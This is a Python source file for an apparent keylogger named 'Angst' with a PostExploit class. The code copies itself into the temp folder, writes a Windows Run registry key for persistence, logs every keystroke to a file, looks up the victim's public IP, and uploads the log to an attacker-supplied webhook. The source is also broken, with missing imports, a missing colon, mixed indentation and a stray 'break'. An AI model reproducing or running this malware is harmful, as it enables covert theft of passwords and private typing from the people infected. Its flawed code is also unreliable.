import requests
import temp
import winreg
import shutil
import logging
from pynput.keyboard import Key, Listener

class PostExploit():
	def __init__(self):
                self.limit = 200
            	self.title = ""
                file_name = os.path.basename(sys.argv[0])
                temp=tempfile.gettempdir()
                shutil.copy(file_name, temp)
                file_temp=temp + "\\" + file_name
                try:
                    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(registry_key, 'Angst inc.', 0, winreg.REG_SZ, file_temp)
                    winreg.CloseKey(registry_key)
                except:
                    pass

	def keylog(self):
            i=0
	    self.title = requests.get("https://api.ipify.org").text
            def on_press(key)
                with open('angst_log.txt', 'a') as log:
                    log.write(str(key))
            with Listener(on_press=on_press) as listener:
                while i<self.limit:
                    listener.join()
                break
                    
	def dump(self, webhook):
		self.keylog()
                done = {
                    "avatar_url":"https://i.imgur.com/tkQZZL2.png",
                    "name":"Angst Logger",
                    "embeds": [
                        {
                            "title": self.title,
                            "description": "Angst has created new log file.",
                            "color": 15146294,

                            "thumbnail": {
                                "url": "https://i.imgur.com/tkQZZL2.png"
                            }
                        }
                    ]
                }
                requests.post(webhook, json=done)
                requests.post(webhook, files={'upload_file': open('angst_log.txt','rb')})
            
